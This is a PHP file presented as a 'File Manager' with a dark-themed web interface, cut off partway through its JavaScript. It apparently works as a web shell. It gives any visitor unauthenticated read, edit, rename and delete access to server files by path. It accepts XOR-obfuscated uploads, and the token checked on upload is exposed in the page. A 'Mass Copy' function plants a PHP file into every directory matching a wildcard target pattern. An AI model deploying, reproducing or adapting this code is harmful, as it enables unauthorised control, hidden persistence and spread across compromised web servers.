<?php
@clearstatcache();

class FileManager {
    private $baseDir, $baseDrive, $currentDir, $uploadSecret, $uploadToken, $xorKey;

    public function __construct() {
        $this->baseDir = getcwd();
        $this->baseDrive = strtoupper(substr($this->baseDir, 0, 2));
        $this->currentDir = $_REQUEST['dir'] ?? $this->baseDir;
        if (strtoupper(substr($this->currentDir, 0, 2)) !== $this->baseDrive) $this->currentDir = $this->baseDir;
        
        $this->uploadSecret = hash('sha256', __FILE__ . $_SERVER['SERVER_NAME'] . php_uname('n'));
        if (session_status() === PHP_SESSION_NONE) session_start();
        if (empty($_SESSION['upload_token']) || time() - ($_SESSION['upload_token_time'] ?? 0) > 3600) {
            $_SESSION['upload_token'] = bin2hex(random_bytes(32));
            $_SESSION['upload_token_time'] = time();
        }
        $this->uploadToken = $_SESSION['upload_token'];
        $this->xorKey = substr(hash('sha256', $this->uploadToken . $this->uploadSecret), 0, 32);
    }

    public function getCurrentDir() { return $this->currentDir; }
    public function getUploadToken() { return $this->uploadToken; }
    public function getXorKey() { return $this->xorKey; }

    private function xorDecode($data, $key) {
        $data = base64_decode($data, true);
        if ($data === false) return false;
        $result = ''; $kLen = strlen($key); $dLen = strlen($data);
        for ($i = 0; $i < $dLen; $i++) $result .= chr(ord($data[$i]) ^ ord($key[$i % $kLen]));
        return $result;
    }

    public function handleSecureUpload($p) {
        if (!hash_equals($this->uploadToken, $p['token'] ?? '')) return ['success' => false, 'message' => 'Authentication failed'];
        $fn = $p['filename'] ?? ''; $fs = (int)($p['filesize'] ?? 0); $dh = $p['datahash'] ?? ''; $xd = $p['data'] ?? ''; $td = $p['dir'] ?? $this->currentDir;
        if (basename($fn) !== $fn || empty($fn)) return ['success' => false, 'message' => 'Invalid filename'];
        if (preg_match('/[<>:"|?*\\\\]/', $fn)) return ['success' => false, 'message' => 'Illegal characters in filename'];
        $b64 = $this->xorDecode($xd, $this->xorKey);
        if ($b64 === false) return ['success' => false, 'message' => 'Decode failed'];
        if (!hash_equals(hash('sha256', $b64), $dh)) return ['success' => false, 'message' => 'Integrity check failed'];
        $fc = base64_decode($b64, true);
        if ($fc === false) return ['success' => false, 'message' => 'Data corrupt'];
        if (strlen($fc) !== $fs) return ['success' => false, 'message' => 'Size mismatch'];
        $tp = rtrim($td, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $fn;
        if (!is_dir($td)) return ['success' => false, 'message' => 'Target directory not found'];
        if (@file_put_contents($tp, $fc, LOCK_EX) === false) return ['success' => false, 'message' => 'Write failed'];
        return ['success' => true, 'message' => 'Uploaded: ' . $fn, 'directory' => $td];
    }

    public function scanDirectory($dir = null) {
        $dir = $dir ?? $this->currentDir; $items = @scandir($dir);
        if ($items === false) return ['dirs' => [], 'files' => []];
        $dirs = []; $files = [];
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') continue;
            $fp = $dir . DIRECTORY_SEPARATOR . $item;
            if (is_dir($fp)) $dirs[] = ['name' => $item, 'path' => $fp, 'modified' => filemtime($fp)];
            else $files[] = ['name' => $item, 'path' => $fp, 'size' => filesize($fp), 'modified' => filemtime($fp)];
        }
        usort($dirs, function($a, $b) { return strnatcasecmp($a['name'], $b['name']); });
        usort($files, function($a, $b) { return strnatcasecmp($a['name'], $b['name']); });
        return ['dirs' => $dirs, 'files' => $files];
    }

    public function formatSize($b) {
        if ($b <= 0) return '0 B'; $u = ['B','KB','MB','GB','TB']; $p = floor(log($b, 1024));
        return number_format($b / pow(1024, $p), 2) . ' ' . $u[$p];
    }

    public function renderFileList($dir = null) {
        $dir = $dir ?? $this->currentDir; $data = $this->scanDirectory($dir);
        $h = '<div class="f-table"><div class="f-table-head"><div class="th th-name">Name</div><div class="th th-type">Type</div><div class="th th-size">Size</div><div class="th th-actions">Actions</div></div><div class="f-table-body">';
        foreach ($data['dirs'] as $i) $h .= $this->renderRow($i, true);
        foreach ($data['files'] as $i) $h .= $this->renderRow($i, false);
        if (empty($data['dirs']) && empty($data['files'])) {
            $h .= '<div class="empty-state">Empty directory</div>';
        }
        return $h . '</div></div>';
    }

    private function renderRow($item, $isDir) {
        $ep = addslashes($item['path']); $en = htmlspecialchars($item['name']);
        $h = '<div class="f-row"><div class="td td-name">';
        if ($isDir) {
            $h .= '<svg class="icon icon-dir" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>';
            $h .= '<a href="#" onclick="navigateTo(\'' . $ep . '\'); return false;">' . $en . '</a>';
        } else {
            $h .= '<svg class="icon icon-file" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline></svg>';
            $h .= '<span>' . $en . '</span>';
        }
        $h .= '</div>';
        $h .= '<div class="td td-type"><span class="badge ' . ($isDir ? 'badge-dir' : 'badge-file') . '">' . ($isDir ? 'Directory' : 'File') . '</span></div>';
        $h .= '<div class="td td-size">' . ($isDir ? '—' : $this->formatSize($item['size'])) . '</div>';
        $h .= '<div class="td td-actions">';
        if (!$isDir) $h .= '<button class="a-btn" onclick="editFile(\'' . $ep . '\')" title="Edit">Edit</button>';
        $h .= '<button class="a-btn" onclick="renameFile(\'' . $ep . '\', \'' . addslashes($item['name']) . '\')" title="Rename">Rename</button>';
        $h .= '<button class="a-btn a-btn-del" onclick="deleteFile(\'' . $ep . '\', \'' . addslashes($item['name']) . '\')" title="Delete">Delete</button>';
        return $h . '</div></div>';
    }

    public function fetchFile($p) { return (file_exists($p) && is_file($p) && is_readable($p)) ? ['success' => true, 'content' => file_get_contents($p)] : ['success' => false, 'message' => 'Cannot read file']; }
    public function saveFile($p, $c) { return (is_file($p) && is_writable($p)) ? file_put_contents($p, stripslashes($c), LOCK_EX) !== false : false; }
    public function renameItem($o, $n) { return file_exists($o) ? rename($o, dirname($o) . DIRECTORY_SEPARATOR . $n) : false; }
    public function deleteItem($p) { return (file_exists($p) && is_file($p)) ? unlink($p) : false; }

    public function massCopy($pat, $src) {
        $r = []; if (!file_exists($src)) return ['success' => false, 'output' => "Source file not found"];
        $m = glob($pat, GLOB_ONLYDIR);
        if (!empty($m)) { foreach ($m as $d) { $dp = rtrim($d, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . basename($src); $r[] = @copy($src, $dp) ? "OK: $dp" : "FAIL: $dp"; } }
        else { $d = trim($pat); if (empty($d)) return ['success' => false, 'output' => 'Destination empty']; $dp = is_dir($d) ? rtrim($d, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . basename($src) : $d; $r[] = @copy($src, $dp) ? "OK: $dp" : "FAIL: $dp"; }
        return ['success' => true, 'output' => implode("\n", $r)];
    }
}

 $fm = new FileManager();

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    header('Content-Type: application/json'); $a = $_POST['action'];
    switch ($a) {
        case 'list': $d = $_POST['dir'] ?? $fm->getCurrentDir(); echo json_encode(['directory' => $d, 'html' => $fm->renderFileList($d), 'success' => true]); exit;
        case 'upload': $res = $fm->handleSecureUpload($_POST); if ($res['success']) { $d = $res['directory'] ?? $fm->getCurrentDir(); $res['html'] = $fm->renderFileList($d); $res['directory'] = $d; } echo json_encode($res); exit;
        case 'edit': $p = $_POST['path'] ?? ''; $s = $fm->saveFile($p, $_POST['content'] ?? ''); echo json_encode(['success' => $s, 'message' => $s ? 'Saved' : 'Save failed', 'html' => $fm->renderFileList(dirname($p)), 'directory' => dirname($p)]); exit;
        case 'rename': $p = $_POST['oldpath'] ?? ''; $s = $fm->renameItem($p, $_POST['newname'] ?? ''); echo json_encode(['success' => $s, 'message' => $s ? 'Renamed' : 'Rename failed', 'html' => $fm->renderFileList(dirname($p)), 'directory' => dirname($p)]); exit;
        case 'delete': $p = $_POST['path'] ?? ''; $s = $fm->deleteItem($p); echo json_encode(['success' => $s, 'message' => $s ? 'Deleted' : 'Delete failed', 'html' => $fm->renderFileList(dirname($p)), 'directory' => dirname($p)]); exit;
        case 'masscopy': echo json_encode($fm->massCopy($_POST['pattern'] ?? '', $_POST['source'] ?? '')); exit;
    }
    exit;
}
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['action']) && $_GET['action'] === 'fetch') {
    header('Content-Type: application/json'); echo json_encode($fm->fetchFile($_GET['path'] ?? '')); exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>File Manager</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
<style>
*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
:root {
  --bg: #100e18; --surface: #1a1726; --surface-2: #231f30;
  --border: #2e2940; --border-light: #3d365a;
  --purple-light: #b388ff; --purple-dark: #4a148c; --magenta-dark: #880e4f;
  --gray-light: #c4c4c4; --gray: #7a7a7a;
  --text: #dcdcdc; --text-secondary: #999; --text-muted: #5e5e5e;
}
html { font-size: 14px; }
body {
  font-family: 'Inter', -apple-system, sans-serif;
  background: var(--bg); color: var(--text); min-height: 100vh; line-height: 1.5;
  -webkit-font-smoothing: antialiased;
}
body::before {
  content: ''; position: fixed; top: -40%; left: -10%; right: -10%; height: 80%;
  background: radial-gradient(ellipse at 50% 0%, rgba(74, 20, 140, 0.12) 0%, rgba(136, 14, 79, 0.06) 40%, transparent 70%);
  pointer-events: none; z-index: 0;
}
.container { max-width: 1080px; margin: 0 auto; padding: 32px 24px; position: relative; z-index: 1; }
.header { display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 16px; margin-bottom: 24px; }
.header-left { display: flex; align-items: center; gap: 14px; }
.palette { display: flex; gap: 3px; padding: 6px 8px; background: var(--surface); border-radius: 20px; border: 1px solid var(--border); }
.palette span { width: 8px; height: 8px; border-radius: 50%; display: block; }
.palette span:nth-child(1) { background: var(--purple-light); }
.palette span:nth-child(2) { background: var(--purple-dark); }
.palette span:nth-child(3) { background: var(--magenta-dark); }
.palette span:nth-child(4) { background: var(--gray-light); }
.palette span:nth-child(5) { background: var(--gray); }
.logo { font-size: 15px; font-weight: 600; color: var(--text); letter-spacing: -0.3px; }
.header-right { display: flex; gap: 8px; }
.btn {
  display: inline-flex; align-items: center; gap: 6px; padding: 8px 16px;
  border-radius: 6px; border: 1px solid var(--border); background: var(--surface);
  color: var(--text-secondary); font-family: inherit; font-size: 13px; font-weight: 500;
  cursor: pointer; transition: all 0.15s ease;
}
.btn:hover { background: var(--surface-2); color: var(--text); border-color: var(--border-light); }
.btn-accent { background: var(--purple-dark); border-color: var(--purple-dark); color: #e0d0ff; }
.btn-accent:hover { background: #5c1aab; border-color: #6a20c0; color: #fff; }
.btn-magenta { background: var(--magenta-dark); border-color: var(--magenta-dark); color: #f0c0d8; }
.btn-magenta:hover { background: #a0125e; border-color: #b51568; color: #fff; }
.btn:disabled { opacity: 0.4; cursor: not-allowed; }
.path-bar {
  display: flex; align-items: center; gap: 4px; padding: 10px 16px; margin-bottom: 16px;
  background: var(--surface); border: 1px solid var(--border); border-radius: 8px;
  font-family: 'JetBrains Mono', monospace; font-size: 12px; overflow-x: auto;
}
.path-bar::-webkit-scrollbar { height: 0; }
.path-root { color: var(--purple-light); margin-right: 4px; flex-shrink: 0; }
.path-sep { color: var(--text-muted); flex-shrink: 0; margin: 0 1px; }
.path-link { color: var(--text-secondary); text-decoration: none; transition: color 0.15s; flex-shrink: 0; padding: 2px 4px; border-radius: 4px; }
.path-link:hover { color: var(--purple-light); background: rgba(179, 136, 255, 0.06); }
.path-current { color: var(--text); font-weight: 500; }
.status {
  padding: 10px 16px; margin-bottom: 16px; border-radius: 8px; font-size: 13px;
  font-weight: 500; display: none; align-items: center; gap: 8px; animation: fade-in 0.2s ease;
}
@keyframes fade-in { from { opacity: 0; transform: translateY(-4px); } to { opacity: 1; transform: translateY(0); } }
.status.ok { display: flex; background: rgba(179, 136, 255, 0.08); border: 1px solid rgba(179, 136, 255, 0.15); color: var(--purple-light); }
.status.err { display: flex; background: rgba(136, 14, 79, 0.08); border: 1px solid rgba(136, 14, 79, 0.15); color: #ff6b9d; }
.f-table { background: var(--surface); border: 1px solid var(--border); border-radius: 10px; overflow: hidden; }
.f-table-head {
  display: grid; grid-template-columns: 1fr 90px 100px 200px; border-bottom: 1px solid var(--border);
  background: var(--surface-2);
}
.th { padding: 10px 16px; font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; color: var(--text-muted); }
.th-name { padding-left: 20px; } .th-actions { padding-right: 16px; text-align: right; }
.f-table-body { max-height: 58vh; overflow-y: auto; }
.f-table-body::-webkit-scrollbar { width: 5px; }
.f-table-body::-webkit-scrollbar-track { background: transparent; }
.f-table-body::-webkit-scrollbar-thumb { background: var(--border); border-radius: 10px; }
.f-table-body::-webkit-scrollbar-thumb:hover { background: var(--border-light); }
.f-row { display: grid; grid-template-columns: 1fr 90px 100px 200px; border-bottom: 1px solid var(--border); transition: background 0.1s ease; }
.f-row:last-child { border-bottom: none; }
.f-row:hover { background: rgba(179, 136, 255, 0.02); }
.td { padding: 9px 16px; font-size: 13px; display: flex; align-items: center; }
.td-name { padding-left: 20px; gap: 10px; min-width: 0; }
.td-type { justify-content: center; }
.td-size { color: var(--text-secondary); font-family: 'JetBrains Mono', monospace; font-size: 12px; }
.td-actions { gap: 6px; justify-content: flex-end; padding-right: 16px; }
.icon { width: 16px; height: 16px; flex-shrink: 0; }
.icon-dir { color: var(--purple-light); opacity: 0.8; }
.icon-file { color: var(--gray); opacity: 0.6; }
.td-name a { color: var(--text); text-decoration: none; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; transition: color 0.15s; }
.td-name a:hover { color: var(--purple-light); }
.td-name span { color: var(--text-secondary); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
.badge { font-size: 11px; font-weight: 500; padding: 2px 8px; border-radius: 4px; letter-spacing: 0.2px; }
.badge-dir { background: rgba(179, 136, 255, 0.08); color: var(--purple-light); }
.badge-file { background: rgba(122, 122, 122, 0.08); color: var(--gray); }
.a-btn {
  padding: 4px 10px; border-radius: 5px; border: 1px solid var(--border); background: transparent;
  color: var(--text-secondary); font-family: inherit; font-size: 12px; font-weight: 500;
  cursor: pointer; transition: all 0.15s ease;
}
.a-btn:hover { background: var(--surface-2); color: var(--text); border-color: var(--border-light); }
.a-btn-del:hover { background: rgba(136, 14, 79, 0.1); color: #ff6b9d; border-color: rgba(136, 14, 79, 0.3); }
.empty-state { padding: 60px 20px; text-align: center; color: var(--text-muted); font-size: 13px; }
.modal-bg {
  position: fixed; inset: 0; background: rgba(0, 0, 0, 0.6); backdrop-filter: blur(8px);
  -webkit-backdrop-filter: blur(8px); z-index: 1000; display: none; align-items: center; justify-content: center; padding: 20px;
}
.modal-bg.active { display: flex; }
.modal {
  background: var(--surface); border: 1px solid var(--border); border-radius: 12px;
  width: 100%; max-width: 680px; max-height: 88vh; overflow-y: auto;
  box-shadow: 0 24px 80px rgba(0, 0, 0, 0.5); animation: modal-in 0.2s ease;
}
@keyframes modal-in { from { opacity: 0; transform: scale(0.97) translateY(8px); } to { opacity: 1; transform: scale(1) translateY(0); } }
.modal::-webkit-scrollbar { width: 4px; }
.modal::-webkit-scrollbar-track { background: transparent; }
.modal::-webkit-scrollbar-thumb { background: var(--border); border-radius: 10px; }
.modal-head { display: flex; align-items: center; justify-content: space-between; padding: 18px 20px; border-bottom: 1px solid var(--border); }
.modal-title { font-size: 14px; font-weight: 600; color: var(--text); }
.modal-close {
  width: 32px; height: 32px; display: flex; align-items: center; justify-content: center;
  border: none; background: transparent; color: var(--text-muted); cursor: pointer;
  border-radius: 6px; font-size: 18px; transition: all 0.15s;
}
.modal-close:hover { background: var(--surface-2); color: var(--text); }
.modal-body { padding: 20px; }
.modal-foot {
  display: flex; gap: 8px; justify-content: flex-end; padding: 16px 20px; border-top: 1px solid var(--border);
  background: var(--surface-2); border-radius: 0 0 12px 12px;
}
.form-group { margin-bottom: 16px; }
.form-group:last-child { margin-bottom: 0; }
.form-label { display: block; font-size: 12px; font-weight: 500; color: var(--text-secondary); margin-bottom: 6px; }
.form-input, .form-textarea {
  width: 100%; padding: 9px 12px; background: var(--bg); border: 1px solid var(--border);
  border-radius: 6px; color: var(--text); font-family: inherit; font-size: 13px; outline: none; transition: border-color 0.15s;
}
.form-input:focus, .form-textarea:focus { border-color: var(--purple-dark); box-shadow: 0 0 0 3px rgba(74, 20, 140, 0.15); }
.form-textarea { min-height: 360px; resize: vertical; line-height: 1.65; font-family: 'JetBrains Mono', monospace; font-size: 12.5px; }
.form-input[readonly] { color: var(--text-muted); cursor: default; }
.upload-drop {
  border: 1px dashed var(--border-light); border-radius: 10px; padding: 36px;
  text-align: center; cursor: pointer; transition: all 0.2s;
}
.upload-drop:hover, .upload-drop.over { border-color: var(--purple-light); background: rgba(179, 136, 255, 0.03); }
.upload-drop-icon {
  width: 40px; height: 40px; margin: 0 auto 12px; border-radius: 50%; background: var(--surface-2);
  display: flex; align-items: center; justify-content: center; color: var(--purple-light);
}
.upload-drop-icon svg { width: 18px; height: 18px; }
.upload-drop-text { color: var(--text-secondary); font-size: 13px; }
.upload-drop-hint { color: var(--text-muted); font-size: 12px; margin-top: 6px; }
#fileInput { display: none; }
.upload-progress { margin-top: 16px; display: none; }
.progress-track { width: 100%; height: 3px; background: var(--bg); border-radius: 10px; overflow: hidden; }
.progress-fill { height: 100%; width: 0%; background: linear-gradient(90deg, var(--purple-dark), var(--magenta-dark)); border-radius: 10px; transition: width 0.25s ease; }
.progress-label { font-size: 11px; color: var(--text-muted); margin-top: 8px; text-align: center; }
.copy-output {
  background: var(--bg); border: 1px solid var(--border); border-radius: 6px; padding: 12px; margin-top: 12px;
  max-height: 180px; overflow-y: auto; font-family: 'JetBrains Mono', monospace; font-size: 12px;
  white-space: pre-wrap; color: var(--text-secondary); line-height: 1.6;
}
.confirm-text { color: var(--text-secondary); font-size: 13px; line-height: 1.6; }
.confirm-text strong { color: var(--text); }
.sec-note {
  margin-top: 14px; padding: 8px 12px; background: var(--bg); border: 1px solid var(--border);
  border-radius: 6px; font-size: 11px; color: var(--text-muted); display: flex; align-items: center; gap: 8px;
}
.sec-note svg { width: 14px; height: 14px; color: var(--purple-light); opacity: 0.6; flex-shrink: 0; }
.spinner {
  display: inline-block; width: 14px; height: 14px; border: 2px solid var(--border);
  border-top-color: var(--purple-light); border-radius: 50%; animation: spin 0.7s linear infinite;
}
@keyframes spin { to { transform: rotate(360deg); } }
@media (max-width: 768px) {
  .container { padding: 16px; }
  .f-table-head, .f-row { grid-template-columns: 1fr 80px 80px 160px; font-size: 12px; }
  .header { flex-direction: column; align-items: flex-start; }
  .modal { max-width: 100%; }
  .form-textarea { min-height: 260px; }
}
@media (max-width: 540px) {
  .f-table-head { display: none; }
  .f-row { grid-template-columns: 1fr auto; gap: 8px; }
  .td-type, .td-size { display: none; }
  .td-actions { flex-direction: column; align-items: flex-end; }
}
</style>
</head>
<body>
<div class="container">
  <div class="header">
    <div class="header-left">
      <div class="palette"><span></span><span></span><span></span><span></span><span></span></div>
      <div class="logo">File Manager</div>
    </div>
    <div class="header-right">
      <button class="btn" onclick="openUploadModal()">Upload</button>
      <button class="btn btn-accent" onclick="openMassCopyModal()">Mass Copy</button>
    </div>
  </div>
  <div class="path-bar" id="breadcrumbs">
    <span class="path-root">~/</span>
    <span class="path-current"><?php echo htmlspecialchars($fm->getCurrentDir()); ?></span>
  </div>
  <div class="status" id="statusBar"><span id="statusText"></span></div>
  <div id="fileList"><?php echo $fm->renderFileList(); ?></div>
</div>

<div class="modal-bg" id="editModal">
  <div class="modal" style="max-width:860px">
    <div class="modal-head"><div class="modal-title">Edit — <span id="editFileName" style="color:var(--purple-light)"></span></div><button class="modal-close" onclick="closeModal('editModal')">✕</button></div>
    <div class="modal-body"><textarea class="form-textarea" id="editContent" spellcheck="false"></textarea></div>
    <div class="modal-foot"><button class="btn" onclick="closeModal('editModal')">Cancel</button><button class="btn btn-accent" onclick="saveFile()">Save</button></div>
  </div>
</div>

<div class="modal-bg" id="renameModal">
  <div class="modal" style="max-width:440px">
    <div class="modal-head"><div class="modal-title">Rename</div><button class="modal-close" onclick="closeModal('renameModal')">✕</button></div>
    <div class="modal-body">
      <div class="form-group"><div class="form-label">Current name</div><input type="text" class="form-input" id="renameOldName" readonly></div>
      <div class="form-group"><div class="form-label">New name</div><input type="text" class="form-input" id="renameNewName" placeholder="Enter new name"></div>
    </div>
    <div class="modal-foot"><button class="btn" onclick="closeModal('renameModal')">Cancel</button><button class="btn btn-accent" onclick="confirmRename()">Rename</button></div>
  </div>
</div>

<div class="modal-bg" id="deleteModal">
  <div class="modal" style="max-width:400px">
    <div class="modal-head"><div class="modal-title">Delete file</div><button class="modal-close" onclick="closeModal('deleteModal')">✕</button></div>
    <div class="modal-body"><p class="confirm-text">Are you sure you want to delete <strong id="deleteFileName"></strong>?<br><br>This cannot be undone.</p></div>
    <div class="modal-foot"><button class="btn" onclick="closeModal('deleteModal')">Cancel</button><button class="btn btn-magenta" onclick="confirmDelete()">Delete</button></div>
  </div>
</div>

<div class="modal-bg" id="uploadModal">
  <div class="modal" style="max-width:480px">
    <div class="modal-head"><div class="modal-title">Upload</div><button class="modal-close" onclick="closeModal('uploadModal')">✕</button></div>
    <div class="modal-body">
      <div class="upload-drop" id="uploadArea" onclick="document.getElementById('fileInput').click()">
        <div class="upload-drop-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="17 8 12 3 7 8"></polyline><line x1="12" y1="3" x2="12" y2="15"></line></svg></div>
        <div class="upload-drop-text">Drop file here or click to browse</div>
        <div class="upload-drop-hint" id="uploadFileName">No file selected</div>
      </div>
      <input type="file" id="fileInput" onchange="handleFileSelect(this)">
      <div class="upload-progress" id="uploadProgress">
        <div class="progress-track"><div class="progress-fill" id="progBar"></div></div>
        <div class="progress-label" id="progText">Processing...</div>
      </div>
      <div class="sec-note">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
        Encrypted transfer with XOR + SHA-256 verification
      </div>
    </div>
    <div class="modal-foot"><button class="btn" onclick="closeModal('uploadModal')">Cancel</button><button class="btn btn-accent" id="uploadBtn" onclick="uploadFile()" disabled>Upload</button></div>
  </div>
</div>

<div class="modal-bg" id="massCopyModal">
  <div class="modal" style="max-width:520px">
    <div class="modal-head"><div class="modal-title">Mass Copy</div><button class="modal-close" onclick="closeModal('massCopyModal')">✕</button></div>
    <div class="modal-body">
      <div class="form-group"><div class="form-label">Source file</div><input type="text" class="form-input" id="massCopySource" placeholder="e.g. C:/source/file.php"></div>
      <div class="form-group"><div class="form-label">Destination pattern</div><input type="text" class="form-input" id="massCopyPattern" placeholder="e.g. D:/targets/*/"><small style="color:var(--text-muted);margin-top:4px;display:block;font-size:11px">Use * as wildcard</small></div>
      <div id="massCopyResults" style="display:none"><div class="form-label" style="margin-bottom:8px">Output</div><div class="copy-output" id="massCopyOutput"></div></div>
    </div>
    <div class="modal-foot"><button class="btn" onclick="closeModal('massCopyModal')">Cancel</button><button class="btn btn-accent" onclick="executeMassCopy()">Execute</button></div>
  </div>
</div>

<script>
let currentDir = "<?php echo addslashes($fm->getCurrentDir()); ?>";
let editFilePath = '', deleteFilePath = '', renameFilePath = '', selectedFile = null;
const UPLOAD_TOKEN = "<?php echo $fm->getUploadToken(); ?>";
const XOR_KEY = "<?php echo $fm->getXorKey(); ?>";
const SELF = "<?php echo $_SERVER['PHP_SELF']; ?>";

function esc(t) { let m={'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#039;'}; return t.replace(/[&<>"']/g, c => m[c]); }
function fmtSize(b) { if(b===0)return '0 B'; let u=['B','KB','MB','GB'], p=Math.floor(Math.log(b)/Math.log(1024)); return (b/Math.pow(1024,p)).toFixed(2)+' '+u[p]; }

function showStatus(msg, ok) {
    const el = document.getElementById('statusBar'), tx = document.getElementById('statusText');
    el.className = 'status ' + (ok ? 'ok' : 'err');
    tx.textContent = msg; el.style.display = 'flex';
    setTimeout(() => { el.style.display = 'none'; }, 4000);
}

function openModal(id) { document.getElementById(id).classList.add('active'); document.body.style.overflow = 'hidden'; }
function closeModal(id) { document.getElementById(id).classList.remove('active'); document.body.style.overflow = ''; }

document.querySelectorAll('.modal-bg').forEach(o => {
    o.addEventListener('click', e => { if (e.target === o) { o.classList.remove('active'); document.body.style.overflow = ''; } });
});
document.addEventListener('keydown', e => {
    if (e.key === 'Escape') { document.querySelectorAll('.modal-bg.active').forEach(m => m.classList.remove('active')); document.body.style.overflow = ''; }
});

/*
 * ROBUST SHA-256 IMPLEMENTATION
 * Uses native Web Crypto API if available (HTTPS/localhost).
 * Falls back to pure JS SHA-256 if blocked by non-secure context (HTTP).
 */
async function sha256(message) {
    if (window.crypto && window.crypto.subtle) {
        const msgBuffer = new TextEncoder().encode(message);
        const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
        return Array.from(new Uint8Array(hashBuffer)).map(b => b.toString(16).padStart(2, '0')).join('');
    }

    // Pure JS Fallback
    function rR(n, x) { return (n >>> x) | (n << (32 - x)); }
    const K = new Uint32Array([0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2]);
    let hash = new Uint32Array([0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a, 0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19]);
    const msgBytes = new TextEncoder().encode(message);
    const len = msgBytes.length;
    const bitLen = len * 8;
    const padLen = (9 + (64 - ((len + 9) % 64)) % 64) || 64;
    const padded = new Uint8Array(len + padLen);
    padded.set(msgBytes);
    padded[len] = 0x80;
    const view = new DataView(padded.buffer);
    view.setUint32(padded.length - 8, Math.floor(bitLen / 0x100000000), false);
    view.setUint32(padded.length - 4, bitLen >>> 0, false);
    for (let i = 0; i < padded.length; i += 64) {
        const w = new Uint32Array(64);
        for (let j = 0; j < 16; j++) w[j] = view.getUint32(i + j * 4, false);
        for (let j = 16; j < 64; j++) {
            const s0 = rR(w[j-15], 7) ^ rR(w[j-15], 18) ^ (w[j-15] >>> 3);
            const s1 = rR(w[j-2], 17) ^ rR(w[j-2], 19) ^ (w[j-2] >>> 10);
            w[j] = (w[j-16] + s0 + w[j-7] + s1) >>> 0;
        }
        let [a, b, c, d, e, f, g, h] = hash;
        for (let j = 0; j < 64; j++) {
            const S1 = rR(e, 6) ^ rR(e, 11) ^ rR(e, 25);
            const ch = (e & f) ^ (~e & g);
            const temp1 = (h + S1 + ch + K[j] + w[j]) >>> 0;
            const S0 = rR(a, 2) ^ rR(a, 13) ^ rR(a, 22);
            const maj = (a & b) ^ (a & c) ^ (b & c);
            const temp2 = (S0 + maj) >>> 0;
            h = g; g = f; f = e; e = (d + temp1) >>> 0;
            d = c; c = b; b = a; a = (temp1 + temp2) >>> 0;
        }
        hash[0] = (hash[0] + a) >>> 0; hash[1] = (hash[1] + b) >>> 0; hash[2] = (hash[2] + c) >>> 0; hash[3] = (hash[3] + d) >>> 0;
        hash[4] = (hash[4] + e) >>> 0; hash[5] = (hash[5] + f) >>> 0; hash[6] = (hash[6] + g) >>> 0; hash[7] = (hash[7] + h) >>> 0;
    }
    let hex = '';
    for (let i = 0; i < 8; i++) hex += ('00000000' + hash[i].toString(16)).slice(-8);
    return hex;
}

function xorEncode(data, key) {
    let r = ''; const kL = key.length;
    for (let i = 0; i < data.length; i++) r += String.fromCharCode(data.charCodeAt(i) ^ key.charCodeAt(i % kL));
    return btoa(r);
}

function postReq(action, data = {}) {
    return new Promise((res, rej) => {
        const xhr = new XMLHttpRequest(), fd = new FormData();
        fd.append('action', action);
        for (const [k, v] of Object.entries(data)) fd.append(k, v);
        xhr.open('POST', SELF, true);
        xhr.onreadystatechange = () => {
            if (xhr.readyState === 4) {
                if (xhr.status === 200) { try { res(JSON.parse(xhr.responseText)); } catch(e) { rej({success:false,message:'System error'}); } }
                else rej({success:false,message:'Network error'});
            }
        };
        xhr.onerror = () => rej({success:false,message:'Connection lost'});
        xhr.send(fd);
    });
}

function updateUI(r) {
    if (r.directory) currentDir = r.directory;
